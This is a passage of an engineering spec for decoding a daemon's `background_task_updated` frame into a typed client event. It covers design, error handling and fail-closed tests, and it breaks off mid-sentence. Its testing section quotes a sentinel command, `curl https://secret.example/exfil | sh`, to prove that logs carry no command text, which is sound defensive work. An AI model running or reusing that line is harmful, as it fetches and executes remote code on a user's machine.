# Spec: Background-task change — decode the daemon `background_task_updated` frame into a typed `backgroundTaskUpdated` event (#565)

**Size:** S (held — PO's `size:s` verified, see § Scope note) · **Security-sensitive:** yes · Split from
#554 · Sibling shipped: #564 (`background_task_started`, commit `dbb163e`) · Next: #566
(`background_task_roster`) · Store consumer: #567

## Context

`background_task_started` (#564, merged) opens a background task; `background_task_updated` reports what
happened to it afterwards. The two join on `task_id`. Together they are what lets a client separate a turn
that ended with work still running from a genuine finish (pyrycode#1240). Today this frame reaches the
client and is dropped as an unmodeled type.

**The lane is the mobile v2 stream over Noise + relay — not ACP.** The daemon fans all three background-task
frames to `interactive`-capable clients on the v2 lane (pyrycode#1394, shipped 2026-08-08); this app
advertises `interactive` (#179). An earlier framing assumed delivery over `pyry acp`; that surface was
retired (pyrycode#1348) and `internal/acpbridge` no longer exists in the daemon tree.

This slice is the **decode half only**, and it ships **dormant**: no renderer surface consumes the event.
The store that assembles the three frames into "what is running right now" is **#567**; the panel is **#568**.

**This is a subset-clone of a one-commit-old sibling, not a fresh design.** `dbb163e` pre-cut the path: the
`EnvelopeType` slot already carries the comment *"#565's `background_task_updated` … join it here"*
(`types.ts:73-77`), and `requireStringArrayOrNull` was written to serve all three frames — its docstring
names this ticket verbatim (`inboundMessage.ts:300-316`).

### Wire facts — mirror the daemon field-for-field, do not drift (CLAUDE.md / ADR 0002)

SSOT: pyrycode `docs/protocol-mobile.md:739-777` §`background_task_updated`,
`internal/protocol/interactive.go:215` (`BackgroundTaskUpdatedPayload`), fixture
`internal/protocol/testdata/background_task_updated.json`. All three verified against the daemon tree
2026-08-19.

- **Type string:** `background_task_updated`.
- **Payload — FOUR fields, Go declaration order:**

  | Wire field | Go type / tag | Notes |
  |---|---|---|
  | `conversation_id` | `string` | Conversation whose turn spawned the task. |
  | `task_id` | `string` | The join key back to the `background_task_started` that opened the task. |
  | `patch` | `string` — **plain `string`, NOT `json.RawMessage`** | What **changed**: claude's patch object carried whole and unparsed, **as a string**. One key observed (`is_backgrounded`). **Empty when claude sent none.** |
  | `truncated_fields` | `[]string`, tag `json:"truncated_fields"` — **no `omitempty`** | Names the fields the daemon cut — for **this** frame `task_id`, `patch`. A literal `null` means nothing was cut. |

- **Canonical fixture** (use its payload verbatim as the happy-path seed — it is deliberately adversarial):

  ```json
  {"conversation_id":"c1","task_id":"task_01ABC",
   "patch":"{\"is_backgrounded\":tr","truncated_fields":["patch"]}
  ```

  Note what the daemon chose to ship as its golden fixture: `patch` is **cut mid-token** and is therefore
  **not valid JSON**. AC2's "a `patch` whose text is not valid JSON decodes without failing" is satisfied by
  the canonical fixture itself — no synthetic case needed.

- **No `turn_id`; opens and closes no turn.** Same as the sibling; the daemon doc says a client renders the
  family *"as its own thread of activity, not as part of the turn it appeared in."*
- Binary → client only, `interactive`-gated, carries an envelope-level `event_id`.

### Three traps specific to this frame

1. **Four fields, not six — cloning means DROPPING, not adding.** The sibling carries `tool_call_id`,
   `description` and `task_type`; this frame has **none of them**, and gains `patch`. Every copy-paste from
   `dbb163e` must delete three fields and rename nothing else. A leftover `description` or `task_type` is
   the single most likely defect in this slice, and it would compile fine at four of the seven sites (the
   payload interface, the parse function, the `DaemonEvent` arm and the emit all accept extra fields being
   *added* without a type error until they disagree with each other).
2. **`patch` is an opaque string that MUST NOT be parsed, and MUST NOT be typed as JSON.** See § Design 1.
   The daemon truncates it at construction (`internal/streamsup/parser.go:106`, `maxTaskPatch = 4 << 10`)
   and a truncated object is no longer valid JSON. The Go field is a plain `string` for exactly this reason.
3. **`requireStringArrayOrNull` already exists.** #564 added it at `inboundMessage.ts:317`. Call it. Do not
   re-derive it, do not fork a variant, do not inline an equivalent.

## Design source

N/A — pure transport / decode slice; the event ships **dormant** with zero rendered surface (AC5 pins that
no timeline item is created). The Figma file is the *mobile* design (`g2HIq2UyPhslEoHRokQmHG`) and contains
**no background-task panel** — the surface is desktop-only and has no counterpart there by construction;
that gap belongs to #568. The visual-fidelity check is intentionally skipped for this ticket.

## Files to read first

Codegraph is **not initialized** in this repo (`codegraph_status` returns *"CodeGraph not initialized for
this project"*, re-confirmed 2026-08-19) — this list was built from direct Read/grep against `main` at
`52796fc`. Line numbers are from that commit; re-grep if they drift.

**Read `git show dbb163e` end-to-end first.** Every edit below has a `background_task_started` counterpart
one commit old. Read the counterpart, then write its subset twin.

| Path (with lines) | What to extract |
|---|---|
| `docs/specs/architecture/564-background-task-started-decode.md` | The end-to-end template, including the scope-note reasoning and the security-review shape. This spec is its subset. |
| `src/shared/wire/types.ts:73-77` | The `EnvelopeType` slot — the existing comment already forward-references this ticket. Add `'background_task_updated'` directly after `'background_task_started'`. |
| `src/shared/wire/types.ts:380-425` | `BackgroundTaskStartedPayload` + its 38-line doc-comment — the interface and comment template. **Six fields; yours has four.** |
| `src/main/transport/inboundMessage.ts:300-334` | **`requireStringArrayOrNull`** — read the docstring, which names this ticket. Call it; do not write a second. |
| `src/main/transport/inboundMessage.ts:255-262` | `requireString` — checks `typeof value !== 'string'`, so `''` passes free. This is why an empty `patch` needs no special case (AC2). |
| `src/main/transport/inboundMessage.ts:275-284` | `requireBoolean` — its docstring states the house "check the TYPE, never truthiness" posture that `patch: ''` relies on. |
| `src/main/transport/inboundMessage.ts:573-603` | `parseBackgroundTaskStartedPayload` + doc — the direct template to scale **down** from six fields to four. |
| `src/main/transport/inboundMessage.ts:127-137` | The `background-task-started` paragraph on the `InboundDaemonMessage` union doc-block — the comment-discipline template. |
| `src/main/transport/inboundMessage.ts:223` | The union arm `{ kind: 'background-task-started'; backgroundTaskStarted: … }` — the new arm's neighbour. |
| `src/main/transport/inboundMessage.ts:1173-1188` | `case 'background_task_started'` — the narrow-before-log block to clone, including its no-content-in-the-log comment. |
| `src/main/transport/inboundMessage.ts` (`MAX_PLAINTEXT_BYTES` guard) | Frame-level oversize guard — already covers the oversized case; mirror, do **not** add a per-field length check. |
| `src/main/diagnosticLog.ts:39-48` | `DiagnosticEvent` — `code?: string` is open, so `code: 'background_task_updated'` needs **no** type widening. Confirms the content-free field set. |
| `src/shared/ipc/events.ts:173-206` | The `backgroundTaskStarted` `DaemonEvent` arm + its 24-line doc — the template, and the load-bearing **KEEP-`conversationId`** precedent stated in-family. |
| `src/main/daemonConnection.ts:683-709` | `case 'background-task-started'` emit — the fresh-named-literal posture, the KEEP-`conversation_id` comment, and the explicit note that **this inner switch has no `assertNever`** (a wrong emit compiles silently). |
| `src/renderer/src/store/daemonEventBridge.ts:150-155` | The per-arm explicit `return null` block with its one-line "why" — clone and retarget. |
| `src/renderer/src/store/modalBridge.ts:88-115` | The no-op fall-through cluster; `backgroundTaskStarted` is at :98 and the trailing comment names it at :112-114. Join both. |
| `src/renderer/src/store/timelineBridge.ts:145-186` | The no-op fall-through cluster; `backgroundTaskStarted` at :158, its rationale at :182-185. **Do not copy `apiRetry` / `compacting`** — those are *owned* arms elsewhere in the file. |
| `src/main/transport/inboundMessage.test.ts:174-176, 236-248` | `encodeBackgroundTaskStarted` helper + the `BACKGROUND_TASK_STARTED` fixture — clone as `encodeBackgroundTaskUpdated` + `BACKGROUND_TASK_UPDATED`. |
| `src/main/transport/inboundMessage.test.ts:1695-1762` | The `background_task_started` recognition describe — including `truncated_fields` null/empty/multi cases (:1706-1731), the `task_type: ''` empty-string case (:1734), and unknown-keys-tolerated (:1752). |
| `src/main/transport/inboundMessage.test.ts:1764-1820` | The fail-closed describe — the per-field absent/mistyped loops and the non-object cases (:1818). |
| `src/main/transport/inboundMessage.test.ts:2765-2802` | The content-free diagnostic test **and** the "does NOT log on a malformed throw path" test — both must be cloned. |
| `src/main/daemonConnection.test.ts:297` | `backgroundTaskStartedPlaintext(payload)` helper — clone as `backgroundTaskUpdatedPlaintext`. |
| `src/main/daemonConnection.test.ts:1799-…` | The `background_task_started stream` round-trip describe: `drivers[0].emit({ type: 'message', plaintext })` against a `connected()` fixture. **This is the harness — there is no `fakeDaemon` here.** |
| `src/renderer/src/store/daemonEventBridge.test.ts:280-300` | The per-arm `.toBeNull()` block — clone one. |
| `src/renderer/src/store/modalBridge.test.ts:178-184` | The inverse-filter `others` array entry — append the new arm with its "ships dormant; its consumer is #567" comment. |
| `src/renderer/src/store/timelineBridge.test.ts:295-302` | The `others` array entry for `backgroundTaskStarted` — the exact model. |
| `src/renderer/src/store/timelineBridge.test.ts:538-…` | **AC5's store-level pin** — the `#564: … creates NO timeline item` test, using the referential-no-op pattern. Clone it. |
| `src/shared/wire/types.test.ts:193-230` | The compile-only `EnvelopeType` admission block + the payload-shape block. Note: vitest strips types, so these are **compile-only RED** — `npm run typecheck` fails, not `npm test`. |
| `CLAUDE.md` (§ Wire protocol, § Don't) | The no-drift rule that forbids narrowing the `truncated_fields` elements or parsing `patch`. |

## Scope note — why this ships as one `s` despite 7 production files

The commit-time **≥5-production-file** self-check trips here (7 `.ts` production files modified, 0 created).
This is the repo's documented **DaemonEvent-arm / bridges-atomic** shape, where that gate is *structurally
unsatisfiable* rather than hiding a blowup. The argument is a compile-atomicity proof:

- A new `DaemonEvent` arm in `events.ts` **compile-forces** a case in all three exhaustive bridges via their
  `assertNever` guard (`daemonEventBridge.ts:172`, `modalBridge.ts:121`, `timelineBridge.ts:192`). Omitting
  any one fails `npm run build` — the QA gate. The three bridges are atomic with the arm.
- The transport decode (`types.ts`, `inboundMessage.ts`, `daemonConnection.ts`) exists *only* to feed that
  arm; a decode-without-arm child is dead code — a decoder whose `kind` is silently dropped, with no emit to
  test.
- Every attempted split therefore yields either a dead-code sub-leaf **or** an arm-bearing child still at
  ≥5 files. No genuine seam exists. Per-frame cost does not amortize, which is exactly why the three
  background-task frames are three tickets (#564 → #565 → #566) rather than one.

**On the total-LOC red line — the honest number.** `git show --stat dbb163e` is **684 insertions across 13
files** (224 production / 460 test), of which roughly two-thirds is doc-comment prose. Scaling that to this
frame: **−35** lines (`requireStringArrayOrNull` and its docstring already exist), **−~12** production lines
(two fewer wire fields across the interface, parse function, `DaemonEvent` arm and emit), **−~35** test lines
(three required strings instead of five in the fail-closed loops; no `tool_call_id` trap test), **+~20** test
lines (the invalid-JSON `patch` and empty-`patch` pins). Projected total ≈ **620 lines**.

That is marginally over the `~600` guideline, and I am recording it at face value rather than re-counting it
under the line. Three facts decide it:

1. **The identical but strictly larger shape shipped clean.** `dbb163e` (#564) at 684 lines, six fields, plus
   a brand-new field narrower, was developer-complete with zero deviations and passed code-review with zero
   findings. This slice is a proper subset of it with a one-commit-old template to copy. If 684 fit the
   budget, 620 does.
2. **The red line's prescribed remedy is unavailable.** Every red line resolves to "split," and the
   compile-atomicity proof above shows no seam exists. Forcing one produces a dead-code leaf — strictly worse
   than shipping the atomic slice.
3. **The overage is prose, not turns.** The excess over 600 is doc-comment lines written in the same Edit as
   the code they annotate. The turn-budget drivers the red line actually proxies for — reject branches (6,
   down from the sibling's 8), new exported types (1), consumer call sites (4), new files (0) — are all well
   clear, and three of them *decreased* relative to the sibling.

Remaining red lines:

| Red line | This ticket | Verdict |
|---|---|---|
| > 3 **new** files | **0 new files** — every edit is additive to an existing module | clear |
| > ~600 total LOC | ~620 projected — see the three facts above | at the line; held on measured subset-of-`dbb163e` evidence |
| > 5 new exported types | **1** — `BackgroundTaskUpdatedPayload` | clear |
| > 10 consumer call sites | **4** — 1 emit + 3 compile-forced bridges. Zero external fan-out: the event ships dormant | clear |
| > 5 acceptance criteria | **exactly 5** | at the line, not over |
| > 10 reject branches | **6** — non-object payload, 3 × `requireString`, non-array-non-null `truncated_fields`, non-string element | clear (down from the sibling's 8) |

**File-overlap check (§ 1.5):** run 2026-08-19 after `git fetch origin --prune` against all 11
`origin/feature/*` branches for the 13 files this slice touches. **No overlap.** Siblings #566 / #567 have no
branches yet; whichever lands second rebases onto the first, the normal path for this repo's sequential frame
slices.

## Design

Seven touch-points, mirroring #564 (`dbb163e`) end-to-end. **No new files. No new helpers.**

### 1. Wire type — `src/shared/wire/types.ts`

- Add `'background_task_updated'` to the `EnvelopeType` union, directly after `'background_task_started'`
  (:77). The existing block comment at :73-76 already forward-references this ticket; trim its "join it
  here" phrasing to stay accurate now that the member has landed, and give the new member a short comment of
  its own. Keep the edit minimal — no restructuring of neighbouring members.
- Add the payload interface — a contract sketch, doc-commented in the `BackgroundTaskStartedPayload` (:380)
  style:

  ```ts
  export interface BackgroundTaskUpdatedPayload {
    conversation_id: string
    task_id: string
    patch: string
    truncated_fields: string[] | null
  }
  ```

  Field order mirrors `interactive.go:215`. The doc-comment must record, at minimum: that it is the **peer**
  of `background_task_started`, joined on `task_id` (that frame opens the task, this one reports what changed
  afterwards); that it carries **no `turn_id`** and opens/closes no turn, so it is not a turn-stream item;
  that `truncated_fields: null` means "nothing was cut" and is a distinct value from `[]`; that
  `truncated_fields` for **this** frame names `task_id` / `patch` — a *different* pair from the sibling's,
  which is itself the argument against ever narrowing the element vocabulary to a client-side union; and the
  two `patch` rules below, which are the reason this interface exists in the shape it does.

  **`patch` is an opaque string. Do not type it as JSON, do not parse it, do not enumerate its keys.**
  Three independent reasons, all of which belong in the doc-comment:

  - *It provably may not parse.* The daemon truncates it at construction (`maxTaskPatch = 4 << 10`,
    `internal/streamsup/parser.go:106`) and a truncated object is not valid JSON. The Go field is a plain
    `string`, not `json.RawMessage`, for exactly this reason — typing it as structured JSON on this wire
    would be a lie that broke decoding. The daemon's own golden fixture ships `"{\"is_backgrounded\":tr"`,
    cut mid-token.
  - *Enumerating keys silently discards claude's next one.* The daemon deliberately enumerates none, because
    a mapping that listed the keys it knew would drop every key claude ships next. A client must do the same:
    read the keys it understands, pass the rest through or ignore it. Any consumer that later wants its keys
    parses **behind an error branch that falls back to rendering it as text** — and that is #567/#568's
    problem, not this slice's.
  - *It is untrusted text.* See § Design 3 and the security review.

  **Do not try to reconcile `patch` against `truncated_fields`.** The daemon also scrubs invalid UTF-8 from
  `patch` by **deleting** the offending bytes, while `truncated_fields` reports the cap cut **only** — so
  `patch` can differ from claude's bytes without appearing in `truncated_fields`. That is a stated upstream
  limitation, and a client cannot act differently either way. Record it; add no cross-check.

### 2. Inbound decode — `src/main/transport/inboundMessage.ts`

**2a. No new narrower.** `requireStringArrayOrNull` (:317) already encodes this frame's exact contract, and
its docstring names this ticket. Call it. The `patch` field needs nothing new either: `requireString` (:256)
checks `typeof value !== 'string'`, so `''` passes free — the same type-not-truthiness posture
`requireBoolean` (:275) documents for `false`.

**2b. Payload narrower.** Add next to `parseBackgroundTaskStartedPayload` (:592):

```ts
function parseBackgroundTaskUpdatedPayload(payload: unknown): BackgroundTaskUpdatedPayload
```

Behaviour: `isRecord` guard (throws `WireDecodeError('malformed background_task_updated payload')` on a
non-object), then `requireString` for `conversation_id` / `task_id` / `patch`, then
`requireStringArrayOrNull` for `truncated_fields`. Returns a **fresh four-field literal** — unknown
server-added keys tolerated (forward-compat) but never copied through, which also makes it
prototype-pollution-safe. Messages name the failure **category only**; never interpolate a value (`patch` may
carry command text; `task_id` / `conversation_id` are correlating identifiers).

Two properties fall out of the shape rather than needing their own checks, and both must be stated in the
docstring because they are invisible in the code:

- **An empty `patch` is valid.** `patch` has no `omitempty` on the Go struct and is documented as *"Empty
  when claude sent none"*, so `''` is a real wire value carried as `''`, not a missing field. A later
  "hardening" to a `.length` or truthiness check would silently break a valid frame — which is why AC2
  demands a test for it.
- **An omitted `patch` key fails closed.** Also from the no-`omitempty` fact: the key is always on the wire,
  so `undefined` is an absence, and `requireString` throws on it. Same for `truncated_fields` via
  `requireStringArrayOrNull`.

**No per-field length check.** Both strings are bounded by the daemon at construction, and the frame-level
`MAX_PLAINTEXT_BYTES` guard already fails an oversized frame closed before this arm runs — the same reliance
`api_retry` / `queue_state` / `background_task_started` have. Mirror, do not add.

**No closed-set validation of the `truncated_fields` elements.** They name this frame's own wire fields today
(`task_id`, `patch`), and a client-side allowlist would fail-close a valid future frame. The fact that this
pair *differs* from the sibling's four is the concrete demonstration that the vocabulary is per-frame and
moves. Same no-cross-validate posture `parseQueuedItem` documents.

**2c. Inbound arm.** Import `BackgroundTaskUpdatedPayload`; add to `InboundDaemonMessage` beside :223:

```ts
| { kind: 'background-task-updated'; backgroundTaskUpdated: BackgroundTaskUpdatedPayload }
```

Hyphenated `kind`, matching `background-task-started` / `api-retry` / `queue-state`. Extend the union's
doc-comment block in the `background-task-started` paragraph's style (:127-137): what the frame is, that the
consumer carries **all four fields onward, `conversation_id` included**, and that the fail-closed defence is
three required strings plus one required-present nullable array.

**2d. Type-switch arm.** Add `case 'background_task_updated':` to `parseInboundMessage` beside :1173, cloning
that block: **narrow before logging** (so a malformed frame throws before any record is written), then
`diagnosticLog?.event({ event: 'inbound-decoded', code: 'background_task_updated', bytes: plaintext.length, hash: hashPlaintext(plaintext) })`,
then `return { kind: 'background-task-updated', backgroundTaskUpdated }`.

**Log nothing but the existing content-free field set.** No decoded field may be added to the record — least
of all `patch`, whose keys may carry command text. Adding one would require widening `DiagnosticEvent` and
would disturb #131's renderer pin. `code?: string` (`diagnosticLog.ts:43`) is already open.

### 3. Typed event — `src/shared/ipc/events.ts`

Add the arm to `DaemonEvent`, after the `backgroundTaskStarted` arm (:198-206):

```ts
| {
    type: 'backgroundTaskUpdated'
    conversationId: string
    taskId: string
    patch: string
    truncatedFields: readonly string[] | null
  }
```

snake→camel on every field; `readonly` on the array mirrors the sibling and `queueState`.

Doc-comment it in the sibling's (:173) style, recording: that it is the peer of `backgroundTaskStarted`,
joined on `taskId`; that it carries **`conversationId`** and why (§ 4); that `patch` is an **opaque display
blob that is not guaranteed to parse** — a consumer that wants its keys must do so behind an error branch
falling back to inert text, and must never enumerate a closed key set; that `patch` may be `''` meaning
claude sent no change, which is a value and not an absence; that `truncatedFields: null` means "nothing was
cut" and must not be collapsed into `[]`, and that it reports the **cap cut only**, so `patch` may differ
from claude's bytes without appearing there; the **SECURITY** constraint that `patch` is UNTRUSTED,
model-influenced daemon-relayed text whose keys may carry command text exactly as the sibling's `description`
does — render as **plain text, NEVER HTML** (no `innerHTML` / `dangerouslySetInnerHTML`), never into an
attribute or a URL, and never executed or re-shelled; that no token, key, or raw frame can ride it (three
bounded opaque strings and a list of wire field names is the whole payload); and that it ships **dormant** —
all three exhaustive bridges no-op it until #567.

### 4. Emit — `src/main/daemonConnection.ts`

Add `case 'background-task-updated':` to the `switch (inbound.kind)` dispatch, beside :683:

```ts
emitDaemonEvent(sink, {
  type: 'backgroundTaskUpdated',
  conversationId: inbound.backgroundTaskUpdated.conversation_id,
  taskId: inbound.backgroundTaskUpdated.task_id,
  patch: inbound.backgroundTaskUpdated.patch,
  truncatedFields: inbound.backgroundTaskUpdated.truncated_fields
})
```

**A fresh named-field literal, never a spread** of `inbound.backgroundTaskUpdated`. This is the
anti-smuggling net: a decoder that later grows a field cannot ride across IPC without an explicit edit here.
`truncatedFields` passes the already-narrowed array **by reference** — `requireStringArrayOrNull` returned a
fresh, fully-validated `string[]`, so there is nothing left to strip.

**`conversation_id` is KEPT.** This is settled in-family, not a fresh argument: the sibling's emit at
:683-709 keeps it and its comment calls that *"the deliberate divergence from api-retry / compacting above."*
The repo's rule is **"turn-stream item, or daemon state?"** — dropped for turn-stream items on the single
active conversation (`turnState`, `toolUse`, `toolResult`, `apiRetry`, `stall`, `compacting`), kept for
daemon state that is replacement-truth and whose store keys by it (`queueState`, #292/#293/#720). This frame
is the second bucket on every axis: no `turn_id`, opens and closes no turn. #567 attributes tasks by id and
would be unbuildable without it.

**Not compile-forced.** This inner switch has no `assertNever` default (:652 states it), so a missing or
wrong emit compiles silently and drops the decoded kind. The round-trip tests (§ Testing strategy) are the
**only** guard on this leg and are not optional.

### 5-7. Exhaustive bridge no-ops (compile-forced)

Each of `daemonEventBridge.ts`, `modalBridge.ts`, `timelineBridge.ts` switches exhaustively over
`DaemonEvent` with an `assertNever` default; the new arm is a compile error in all three until each gets a
case. Add `case 'backgroundTaskUpdated': return null` in each file's existing house style, in every instance
directly alongside the `backgroundTaskStarted` arm the sibling added:

- **`daemonEventBridge.ts` (:150)** — a per-arm explicit block with a one-line "why" comment: the
  background-task store **#567**, not yet built, holds the task set; the session store holds no
  background-task state at all.
- **`modalBridge.ts` (:98)** — join the fall-through cluster and extend the trailing comment (:112-114) to
  name the arm: ships dormant, consumer is #567, and a change to a task claude left running is not a modal —
  nothing is waiting on an answer.
- **`timelineBridge.ts` (:158)** — join the no-op fall-through cluster and extend the trailing comment
  (:182-185). **Do not copy `case 'apiRetry'` or `case 'compacting'`** — both are *owned* arms elsewhere in
  this file that return a `ThreadEvent`. The model here is the adjacent `backgroundTaskStarted` /
  `queueState` rationale: daemon STATE, not a turn-stream item; and here the wire says so outright — no
  `turn_id`, opens and closes no turn. Whether the background-task panel ever becomes a timeline surface is
  **#568's** call.

No behaviour anywhere; the first consumer is #567.

### Non-goals, named so they are not re-litigated

- **`event_id` needs no work.** `codec.ts:136` already decodes the envelope-level `event_id` generically into
  the optional `Envelope.event_id`, and this app advertises no `last_event_id` in `hello`, so there is no
  replay path to plumb. Do not touch it.
- **No generic "background-task frame" abstraction.** #566 needs the same seam for the roster. Building a
  shared abstraction with two instances in hand, when the third has a different shape (a nested row array),
  is speculative generality. The seam is already clone-friendly, and the one thing worth factoring out
  (`requireStringArrayOrNull`) was factored out by #564.
- **No `patch` parsing, no key enumeration, no JSON typing.** § Design 1.
- **No client-side state.** No dedup, no task map, no join against the sibling's `task_id`, no correlation
  memory. Assembling the three frames into a task set is **#567**.

## State + concurrency model

None introduced. This is a pure decode + emit leg: no store slice, no async task, no subscription, no timer,
no accumulated state. The event flows through the existing
`parseInboundMessage → daemonConnection dispatch → emitDaemonEvent → IPC → bridges` path already built for
`background_task_started` / `queue_state`.

Statelessness is load-bearing, not incidental. This frame is the one most likely to tempt a developer into
holding state, because it is *definitionally* an update to something else — the join back to
`background_task_started` on `task_id` is right there in the wire doc. **Do not perform that join here.**
Ordering is claude's, not the daemon's: the daemon doc records that a roster can arrive before the
`background_task_started` for a task it lists, so an `updated` frame for a task this client never saw opened
is a legal, expected frame — not an error, not something to buffer until the `started` shows up. N frames
produce N events, in arrival order, with no work. #567 joins on `task_id` precisely because order is not
guaranteed.

## Error handling

| Layer | Failure | Result |
|---|---|---|
| `parseBackgroundTaskUpdatedPayload` | payload not an object (string, array, `null`) | throws `WireDecodeError('malformed background_task_updated payload')` — fail-closed, no partial value |
| `parseBackgroundTaskUpdatedPayload` | `conversation_id` / `task_id` / `patch` absent or non-string | throws via `requireString` — `missing required field: <name>`, no value interpolated |
| `parseBackgroundTaskUpdatedPayload` | `patch` present and `''` | **succeeds** — carried as `''` ("claude sent no change"), never treated as missing |
| `parseBackgroundTaskUpdatedPayload` | `patch` present and not valid JSON | **succeeds** — it is an opaque string; validity is never assessed |
| `requireStringArrayOrNull` | `truncated_fields` **key omitted** (`undefined`) | throws — the AC3 fail-closed case, falls out of the shape |
| `requireStringArrayOrNull` | `truncated_fields` a string / number / object | throws |
| `requireStringArrayOrNull` | array containing a non-string element | throws — one bad element fails the **whole payload** closed |
| `requireStringArrayOrNull` | literal `null` | returns `null` — a **value**, preserved as "nothing was cut" |
| `requireStringArrayOrNull` | `[]` | returns `[]` — valid, and distinct from `null` |
| `parseInboundMessage` `case 'background_task_updated'` | any of the above | the narrower throws **before** the diagnostic-log call → no record is written for a malformed frame |
| `parseInboundMessage` | oversized frame | caught upstream by the frame-level `MAX_PLAINTEXT_BYTES` guard before this arm runs |
| `daemonConnection` dispatch | `WireDecodeError` from decode | swallowed by the connection's existing catch → the malformed frame is dropped without emitting or throwing |
| UI surface | — | none this slice; the event ships dormant. Rendering and error surfacing belong to #567 / #568 |

## Testing strategy

Test-first (CLAUDE.md): a failing test per criterion, implementation after. `npm test` (vitest) plus
`npm run typecheck` for the compile-guard arms — the `types.test.ts` block is **compile-only RED** (vitest
strips types, so `npm test` will not fail on it; `npm run typecheck` / `npm run build` will).

Scenarios below; the developer writes the bodies in the project's idiom. **Do not pre-write test code from
this spec.**

### `src/shared/wire/types.test.ts`

- A compile-only block admitting `'background_task_updated'` as an `EnvelopeType` (clone :193).
- A compile-only block shaping `BackgroundTaskUpdatedPayload` as its **four** fields — explicitly the
  no-`tool_call_id` / no-`description` / no-`task_type` pin, mirroring the sibling's "no turn_id" block
  (:199). This is the type-level guard against trap 1.

### `src/main/transport/inboundMessage.test.ts`

New `describe` blocks mirroring the `background_task_started` pair at :1695 / :1764, with an
`encodeBackgroundTaskUpdated(payload)` helper cloned from :175 and a `BACKGROUND_TASK_UPDATED` fixture
seeded with **the daemon's canonical fixture payload verbatim** (§ Context) — including the
`patch` value `{"is_backgrounded":tr`, which is invalid JSON by construction.

- **Recognition (AC1):** a valid envelope decodes to
  `{ kind: 'background-task-updated', backgroundTaskUpdated: BACKGROUND_TASK_UPDATED }`. Every one of the
  four fields must carry a **distinct non-empty value** in the fixture, so a field swap or a dropped field
  fails the assertion.
- **`patch` is not valid JSON (AC2):** the canonical fixture already carries a mid-token cut; assert it
  decodes and round-trips the string **byte-for-byte**. Add an explicit comment that no `JSON.parse` is
  attempted anywhere on this path — this test is the pin against a future "let's parse the patch" change.
- **`patch: ''` (AC2):** decodes and carries `''`, asserted with `toBe('')` — **not** a truthiness check, and
  **not** treated as a missing field. In-family precedent: the `task_type: ''` case at :1734.
- **`patch` key omitted (AC2/AC4):** a payload with the other three fields and no `patch` key throws
  `WireDecodeError`. Paired with the previous case, this is what distinguishes required-may-be-empty from
  optional.
- **`truncated_fields: null` (AC3):** decodes to `truncated_fields === null` — asserted with `toBeNull()`,
  **not** `toEqual([])` and not a truthiness check.
- **`truncated_fields: []` (AC3):** decodes to an empty array, distinct from `null`.
- **`truncated_fields` multi-element (AC3):** `['task_id', 'patch']` — this frame's own real pair — round-trips
  in order.
- **`truncated_fields` key omitted (AC3, the fail-closed half):** a payload with the other three fields and
  **no `truncated_fields` key at all** throws `WireDecodeError`.
- **Fail-closed, one case per field (AC4):** each of `conversation_id` / `task_id` / `patch` absent, and
  non-string (a number) — each throws `WireDecodeError`.
- **Fail-closed on `truncated_fields` (AC4):** a string, a number, an object, and an **array containing a
  non-string element** (`['patch', 7]`) — each throws. The last pins "one bad element fails the whole payload
  closed".
- **Fail-closed on a non-object payload (AC4):** a string and an array (clone :1818).
- **Unknown keys tolerated but not copied (AC4):** a payload carrying spurious extra keys — use
  **`task_type` and `description`**, the sibling's fields that this frame must never have, plus `turn_id` —
  decodes to exactly the four known fields. This doubles as the regression test for trap 1.
- **Regression:** a well-formed envelope of a *different* unmodeled type still returns `null` — the new case
  must not widen what decodes.

**Content-free diagnostics** (clone the pair at :2765 / :2792):

- Success path logs exactly one record with `event: 'inbound-decoded'`, `code: 'background_task_updated'`, a
  `bytes` length and a `hash` — and **none of the four decoded fields**. Seed `patch` with a recognisable
  sentinel containing command text (the sibling uses `curl https://secret.example/exfil | sh`) and
  `conversation_id` with the file's `SECRET_CONV` sentinel, then assert both are absent from the serialized
  record, and that `Object.keys(record).sort()` is exactly the existing content-free set. No new
  `DiagnosticEvent` field.
- Malformed path (e.g. `truncated_fields: 'nope'`) **logs nothing** — assert the log sink was not called,
  then assert the throw. This is the narrow-before-log guarantee.

### `src/main/daemonConnection.test.ts`

A new `describe` plus a `backgroundTaskUpdatedPlaintext(payload)` helper cloned from :297, driven through the
round-trip harness at :1799 (`drivers[0].emit({ type: 'message', plaintext })` against a `connected()`
fixture). **This leg is not compile-forced — these tests are the only guard on the emit:**

- **Round-trip (AC1):** a valid frame emits **exactly one**
  `{ type: 'backgroundTaskUpdated', conversationId, taskId, patch, truncatedFields }` with all four values
  distinct and non-empty, asserted as a whole-object `toEqual`. A whole-object assertion is what makes a
  swapped or dropped field fail — **and what catches a leftover `description` / `taskType` copied from the
  sibling** (trap 1), since an extra emitted property fails `toEqual`.
- **`conversationId` is KEPT:** assert `events[0].conversationId` equals the frame's `conversation_id`. The
  sibling's `background_task_started` round-trip block is the model; **do not** clone `api_retry`'s inverse
  `not.toContain('conv-1')` assertion.
- **`patch` crosses IPC byte-for-byte:** the invalid-JSON canonical value survives the emit unchanged.
- **`truncatedFields: null` round-trips as `null`**, and a populated list round-trips element-for-element in
  order.
- **Fail-closed drop:** a malformed frame (omitted `truncated_fields`) emits nothing and does not throw — the
  connection swallows `WireDecodeError`.
- **Anti-smuggling (AC4):** feed a frame whose payload carries an extra key (via `as unknown as`) and assert
  the emitted event has exactly the four modeled properties — proving the fresh-literal emit, not a spread.
- **No dedup / no state / no join:** two `background_task_updated` frames with different `task_id`s emit two
  events in arrival order; a verbatim repeat also emits; and an `updated` frame whose `task_id` was **never
  opened by a `background_task_started`** on this connection still emits normally. That last case pins the
  § State model rule that this layer performs no join and buffers nothing.

### Bridge no-op coverage (AC5)

- `daemonEventBridge.test.ts`: a `.toBeNull()` block for the new arm, cloned from :280.
- `modalBridge.test.ts` (:178) and `timelineBridge.test.ts` (:295): append the new arm to each `others`
  array, with the house one-line "ships dormant; its consumer is #567" comment.
- **The store-level pin (AC5's "no chat timeline item is created"):** clone the `#564` test at
  `timelineBridge.test.ts:538` — using the `fakeBridge()` + `createTimelineStore()` + `subscribeTimeline`
  harness, emit a `backgroundTaskUpdated` event and assert **both** halves of the referential-no-op pattern:
  `expect(store.getState()).toBe(before)` (the reducer returned the same state object) **and**
  `expect(selectItems(store.getState())).toHaveLength(0)`. The second assertion alone is vacuous against a
  store that was already empty; the pair is what actually pins it.

## Open questions

- **None blocking.** The wire shape is fully specified by pyrycode#1394 / `protocol-mobile.md:739-777` /
  `interactive.go:215` / the golden fixture, all verified against the daemon tree 2026-08-19, and the slice
  structure mirrors #564 exactly.
- **Forward-compat posture (a recorded decision, not a question):** if the daemon later adds a field to
